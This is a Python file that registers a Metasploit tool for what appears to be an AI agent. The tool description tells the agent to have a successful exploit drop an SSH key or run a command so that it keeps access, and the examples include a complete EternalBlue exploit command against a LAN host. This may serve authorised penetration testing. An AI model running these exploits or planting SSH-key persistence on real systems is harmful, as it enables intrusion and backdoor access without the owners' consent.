from tools.registry import register
from tools.base import Tool, Param

def msf_command(a: dict) -> list[str]:
    return ["msfconsole", "-q", "-x", a["commands"]]

metasploit = register(Tool(
    name="metasploit",
    description=(
        "Execute Metasploit Framework (msfconsole) commands. Use this for complex exploitation "
        "and payload generation. Metasploit is stateful in an interactive session, but here you "
        "must pass a sequence of commands separated by semicolons. "
        "Always end your command sequence with 'exit' to terminate the console and return output. "
        "If an exploit succeeds, instruct the payload to drop an SSH key or run a specific command, "
        "as the session will be lost when msfconsole exits."
        "Keep in mind there are more exploits than just SMB."
    ),
    params=[
        Param("commands", "string", "A string of msfconsole commands separated by semicolons."),
    ],
    build_command=msf_command,
    examples=[
        "search type:exploit name:eternalblue; exit",
        "use exploit/windows/smb/ms17_010_eternalblue; info; exit",
        "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.5; set LHOST 192.168.1.10; exploit; exit"
    ]
))